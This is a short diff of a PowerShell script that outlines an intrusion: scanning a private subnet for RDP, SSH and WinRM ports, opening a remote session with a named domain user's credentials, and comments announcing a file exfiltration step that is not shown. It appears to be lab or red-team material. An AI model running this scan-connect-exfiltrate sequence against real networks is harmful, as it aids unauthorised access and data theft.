@@ -16,7 +16,7 @@ Install-Module -Name PSnmap -Scope CurrentUser -Force
 Invoke-PSnmap -Cn 10.200.200.0/24 -ScanOnPingFail -Port 443, 3389, 22, 5985, 5986 -Dns -PortConnectTimeoutMs 1000 -AddService
 
 # Connect to remote device
-Enter-PSSession 10.200.200.70
+Enter-PSSession 10.200.200.70 -Credential securex.local\david.altass
 
 # Exfiltrate file
 # Create new file share link
